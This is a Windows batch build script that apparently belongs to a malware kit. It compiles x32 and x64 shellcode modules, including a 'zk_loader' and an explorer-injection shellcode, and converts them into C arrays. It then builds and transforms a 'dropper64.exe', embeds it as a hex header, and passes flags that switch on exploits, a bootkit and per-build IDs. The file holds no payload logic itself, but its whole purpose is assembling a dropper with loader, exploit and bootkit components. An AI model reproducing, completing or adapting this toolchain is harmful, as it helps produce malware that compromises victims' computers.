@ECHO OFF

set LOG_ON=
set USE_EXPLOITS=
set USE_BOOTKIT=
set BUILD_ID=
set SUB_ID=
set TEST_BUILD=

:parsecommandline
if '%1' == '/test' goto test_build
if '%1' == '/log_on' goto log_on
if '%1' == '/use_exploits' goto use_exploits
if '%1' == '/use_bootkit' goto use_bootkit
if '%1' == '/build_id' goto set_build_id
if '%1' == '/sub_id' goto set_sub_id


goto build

:test_build
rem echo TEST BUILD
set TEST_BUILD=/test
shift
goto parsecommandline


:log_on
rem echo LOG ON
set LOG_ON=/log_on
shift
goto parsecommandline

:use_exploits
rem echo USE_EXPLOITS ON
set USE_EXPLOITS=/use_exploits
shift
goto parsecommandline

:use_bootkit
rem echo USE_BOOTKIT ON
set USE_BOOTKIT=/use_bootkit
shift
goto parsecommandline

:set_build_id
rem echo BUILD_ID
set BUILD_ID=/build_id=%2
shift
shift
goto parsecommandline

:set_sub_id
rem echo SUB_ID
set SUB_ID=/sub_id=%2
shift
shift
goto parsecommandline

:build

cd bin

del /q explorer_sc_x32.sys >NUL
del /q explorer_sc_x64.sys >NUL
del /q std_sc_x32.sys >NUL
del /q std_sc_x64.sys >NUL
del /q zk_loader_x32.sys >NUL
del /q zk_loader_x64.sys >NUL
del /q dllmem_sc_x32.sys >NUL
del /q dllmem_sc_x64.sys >NUL

cd ../code

del /q explorer_sc_x32.c
del /q explorer_sc_x64.c
del /q std_sc_x32.c
del /q std_sc_x64.c
del /q zk_loader_x32.c
del /q zk_loader_x64.c
del /q dllmem_sc_x32.c
del /q dllmem_sc_x64.c
del /q dropper64.h

cd ..

cd shellcodes\zk_loader\code
del /s /q ..\obj\x32\release >NUL
start /wait buildrv_x32.cmd
cd ..\..\..
shellcode_maker.exe -i="bin\zk_loader_x32.sys" -o="code" -n="zk_loader_x32" >NUL

cd shellcodes\zk_loader\code
del /s /q ..\obj\x64\release >NUL
start /wait buildrv_x64.cmd
cd ..\..\..
shellcode_maker.exe -i="bin\zk_loader_x64.sys" -o="code" -n="zk_loader_x64"

cd shellcodes\explorer_sc\code
del /s /q ..\obj\x32\release >NUL
start /wait buildrv_x32.cmd
cd ..\..\..
shellcode_maker.exe -i="bin\explorer_sc_x32.sys" -o="code" -n="explorer_sc_x32"

cd shellcodes\explorer_sc\code
del /s /q ..\obj\x64\release >NUL
start /wait buildrv_x64.cmd
cd ..\..\..
shellcode_maker.exe -i="bin\explorer_sc_x64.sys" -o="code" -n="explorer_sc_x64"

cd shellcodes\std_sc\code
del /s /q ..\obj\x32\release >NUL
start /wait buildrv_x32.cmd
cd ..\..\..
shellcode_maker.exe -i="bin\std_sc_x32.sys" -o="code" -n="std_sc_x32"

cd shellcodes\std_sc\code
del /s /q ..\obj\x64\release >NUL
start /wait buildrv_x64.cmd
cd ..\..\..
shellcode_maker.exe -i="bin\std_sc_x64.sys" -o="code" -n="std_sc_x64"

cd shellcodes\dllmem_sc\code
del /s /q ..\obj\x32\release >NUL
start /wait buildrv_x32.cmd
cd ..\..\..
shellcode_maker.exe -i="bin\dllmem_sc_x32.sys" -o="code" -n="dllmem_sc_x32"

cd shellcodes\dllmem_sc\code
del /s /q ..\obj\x64\release >NUL
start /wait buildrv_x64.cmd
cd ..\..\..
shellcode_maker.exe -i="bin\dllmem_sc_x64.sys" -o="code" -n="dllmem_sc_x64"

IF NOT EXIST "autobuild" GOTO CREATE_AB_DIR
del /S /F /Q "autobuild"
:CREATE_AB_DIR
mkdir "autobuild\x64"
mkdir "autobuild\x32"
:GO_ON

start /wait build64.cmd %TEST_BUILD% %USE_EXPLOITS% %USE_BOOTKIT% %LOG_ON% %BUILD_ID% %SUB_ID%

ztransform.exe -i="autobuild\dropper64.exe" -o="autobuild\dropper64.zm"
bin2hex.exe -i="autobuild\dropper64.zm" -o="code\dropper64.h" -n="dropper64_bin"

start /wait build32.cmd %TEST_BUILD% %USE_EXPLOITS% %USE_BOOTKIT% %LOG_ON% %BUILD_ID% %SUB_ID%



